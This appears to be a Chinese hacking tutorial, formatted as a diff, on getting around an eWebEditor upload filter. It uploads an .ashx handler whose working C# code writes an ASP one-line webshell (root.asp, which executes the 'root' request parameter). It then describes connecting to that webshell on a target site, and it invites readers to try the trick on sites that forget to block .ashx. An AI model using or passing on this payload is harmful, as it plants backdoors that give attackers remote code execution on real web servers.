@@ -1,0 +1,40 @@
+这里我们还可以添加一个ashx 脚本类型。用ashx来写一个asp的一句话到当前目录。
+
+代码如下。
+
+<%@ WebHandler Language="C#" Class="Handler" %>
+
+using System;
+using System.Web;
+using System.IO;
+public class Handler : IHttpHandler {
+    
+    public void ProcessRequest (HttpContext context) {
+        context.Response.ContentType = "text/plain";
+        
+        StreamWriter file1= File.CreateText(context.Server.MapPath("root.asp"));
+        file1.Write("<%response.clear:execute request(\"root\"):response.End%>");
+        file1.Flush();
+        file1.Close();
+        
+    }
+
+    public bool IsReusable {
+        get {
+            return false;
+        }
+    }
+
+}
+
+保存为 ashx ，现在来添加一个 ashx 上传类型看看.
+
+上传成功，直接访问 
+
+http://www..xxxxx.com/ admin/eWebEditor/UploadFile/201082143554545.ashx 就会在当前目录生成一个
+
+root.asp的一句话木马。
+  
+看上传文件里，root.asp 已经躺在那边了，用lake2的 一句话连接，看见亲切的hello word !  搞定手工了。
+
+有时候 网站过滤了常见的脚本类型却把 ashx给漏了，大家可以试试 ，菜鸟文章大牛见笑了。。
